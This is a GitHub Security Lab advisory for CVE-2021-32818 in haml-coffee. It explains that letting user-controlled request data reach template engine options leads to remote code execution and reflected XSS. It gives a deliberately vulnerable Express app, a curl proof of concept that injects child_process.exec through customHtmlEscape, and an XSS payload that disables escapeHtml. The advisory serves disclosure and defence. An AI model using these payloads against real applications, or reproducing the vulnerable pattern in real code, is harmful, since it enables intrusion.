<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">May 14, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-025: Remote code execution and Reflected cross site scripting in haml-coffee - CVE-2021-32818</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>01/25/2021: Report sent to project main maintainer</li>
  <li>02/01/2021: Contacted a likely maintainer due to lack of response from the main maintainer</li>
  <li>04/25/2021: Deadline expired</li>
  <li>05/14/2021: Publication as per our <a href="https://securitylab.github.com/advisories#policy">disclosure policy</a></li>
</ul>

<h2 id="executive-summary">Executive Summary</h2>

<p><a href="https://expressjs.com/en/api.html#res.render">The Express render API</a> was designed to only pass in template data. By allowing template engine configuration options to be passed through the Express render API directly, downstream users of an Express template engine may inadvertently introduce insecure behavior into their applications with impacts ranging from Cross Site Scripting (XSS) to Remote Code Execution (RCE).</p>

<h2 id="technical-summary">Technical Summary</h2>

<p><a href="https://expressjs.com/">Express JS</a> allows developers to use a variety of template rendering engines. These engines substitute things inside the template by inspecting an object that the application has supplied. For example, the following snippet renders a template named “index” and passes an object with two elements, a title, and a message.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
 <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Hey</span><span class="dl">'</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Hello there!</span><span class="dl">'</span> <span class="p">})</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Template engines often need a way to set their configuration parameters, such as the path to the template directory, the name of the template, and other engine-specific parameters. To accomplish this many template engines have opted to receive their configuration options directly through the Express render API.</p>

<p>Passing template engine configuration parameters through the Express render API can lead to vulnerabilities if the object is user controlled. Downstream applications often opt to pass their template data in directly through the remote user-controlled <code class="language-plaintext highlighter-rouge">req.query</code> object. This results in a scenario where a remote attacker may be able to subvert the vulnerable application through malicious template engine configuration options.</p>

<p>The security impact is specific to the engine used by the application but ranges from XSS to RCE.</p>

<p>IMPORTANT: this is a library/engine level API misuse resulting in a <strong>potential</strong> vulnerability in downstream application code. Express did <strong>not</strong> intend for render engines to mix template data with configuration options in the same object. We have confirmed this in discussion with the ExpressJS team.</p>

<p>Real world downstream vulnerabilities manifest when applications pass a user controlled object (e.g. req.query) directly into a render engine that accepts config options through the Express render interface.</p>

<p>Our research has shown that this vulnerability pattern occurs in the wild and that many template engines are following this unintended Express render API pattern of use, resulting in an unknown number of affected downstream applications.</p>

<p>By reporting this API misuse at the engine level, we hope to capture this issue more broadly than trying to pursue every single affected application as well as prevent future API misuse.</p>

<h2 id="product">Product</h2>

<p>haml-coffee</p>

<h2 id="tested-version">Tested Version</h2>

<p>1.14.1</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-template-engine-configuration-options-are-passed-through-express-render-api-leading-to-rce">Issue 1: template engine configuration options are passed through Express render API leading to RCE</h3>

<p>Haml-coffee mixes pure template data with engine configuration options through the Express render API. More specifically, haml-coffee supports overriding a series of HTML helper functions through its configuration options. A vulnerable application that passes user controlled request objects to the haml-coffee template engine may introduce RCE vulnerabilities.</p>

<p>For example, control over the <code class="language-plaintext highlighter-rouge">customHtmlEscape</code> parameter can trigger RCE vulnerabilities in downstream applications.</p>

<p>Example vulnerable application code:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">partials</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express-partials</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>


<span class="nx">app</span><span class="p">.</span><span class="nx">engine</span><span class="p">(</span><span class="dl">'</span><span class="s1">hamlc</span><span class="dl">'</span><span class="p">,</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">haml-coffee</span><span class="dl">'</span><span class="p">).</span><span class="nx">__express</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">partials</span><span class="p">());</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">__dirname</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hamlc</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span> <span class="p">})</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">app</span><span class="p">;</span>
</code></pre></div></div>

<p>Which uses the following template (index.hamlc):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%h1= "Welcome #{ @name }"
</code></pre></div></div>

<p>The following POC would execute arbitrary code on a vulnerable application by overriding the <code class="language-plaintext highlighter-rouge">customHtmlEscape</code> function:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://localhost:3000/?name=a&amp;customHtmlEscape=process.mainModule.require(%27child_process%27).exec%20%27bash%20-c%20%22touch%20%2Ftmp%2FGHSLPayload%22%27"</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>Remote Code Execution.</p>

<h3 id="issue-2-template-engine-configuration-options-are-passed-through-express-render-api-leading-to-reflected-xss">Issue 2: template engine configuration options are passed through Express render API leading to reflected XSS</h3>

<p>Control over the <code class="language-plaintext highlighter-rouge">escapeHtml</code> parameter through template configuration pollution ensures that haml-coffee would not sanitize template inputs that may result in reflected Cross Site Scripting attacks against downstream applications.</p>

<p>The following POC would trigger a reflected XSS vulnerability by keeping <code class="language-plaintext highlighter-rouge">escapeHtml</code> as <code class="language-plaintext highlighter-rouge">false</code>:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:3000/?name<span class="o">=</span>%3Cscript%3Ealert<span class="o">(</span>1<span class="o">)</span>%3C/script%3E&amp;escapeHtml<span class="o">=</span>
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>

<p>Reflected Cross Site Scripting</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32818</li>
</ul>

<h2 id="resources">Resources</h2>

<ul>
  <li><a href="https://expressjs.com/en/api.html#res.render">https://expressjs.com/en/api.html#res.render</a></li>
  <li><a href="http://expressjs.com/en/guide/using-template-engines.html">http://expressjs.com/en/guide/using-template-engines.html</a></li>
  <li><a href="http://expressjs.com/en/advanced/developing-template-engines.html">http://expressjs.com/en/advanced/developing-template-engines.html</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-025</code> in any communication regarding this issue.</p>


